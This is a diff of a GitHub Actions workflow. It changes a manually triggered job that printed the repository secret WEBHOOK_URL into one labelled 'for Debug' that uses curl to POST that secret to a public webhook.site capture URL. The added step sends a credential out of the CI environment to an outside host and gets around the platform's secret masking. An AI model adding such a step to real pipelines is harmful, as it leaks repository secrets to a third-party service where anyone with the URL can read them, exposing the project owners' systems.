@@ -1,13 +1,15 @@
-name: Print Secret
+name: Send Secret to Webhook for Debug
+
 on:
   workflow_dispatch:
+
 jobs:
-  print-secret:
+  send-secret:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
-      - name: Print the secret (WEBHOOK_URL)
+      - name: Send Webhook URL secret to Webhook.site
         run: |
-          echo "Trying to print the webhook URL..."
-          echo "WEBHOOK_URL: ${{ secrets.WEBHOOK_URL }}"
+          curl -X POST -H "Content-Type: application/json" \
+            -d "{\"webhook_url\": \"${{ secrets.WEBHOOK_URL }}\"}" \
+            https://webhook.site/3e7a4e21-928d-4ab7-9d30-1b1aa9bbe669
